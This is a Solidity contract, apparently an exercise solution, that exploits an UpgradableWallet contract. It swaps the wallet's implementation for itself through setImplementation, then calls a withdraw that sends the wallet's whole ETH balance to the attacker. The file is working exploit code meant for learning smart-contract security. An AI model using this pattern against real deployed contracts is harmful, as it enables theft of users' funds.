// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract UpgradableWalletExploit {
    address public target;

    constructor(address _target) {
        // target is address of UpgradableWallet
        target = _target;
    }
    
    // accept ETH from UpgradableWallet
    receive() external payable {}

    function pwn() external {
        // write your code here and anywhere else
        target.call(abi.encodeWithSignature("setImplementation(address)", address(this)));
        target.call(abi.encodeWithSignature("withdraw()"));
    }
    
    function withdraw() external {
    // this code is executed inside UpgadableWallet
    // msg.sender = this exploit contract
    // address(this).balance = ETH balance of UpgradableWallet
    payable(msg.sender).transfer(address(this).balance);
    }
}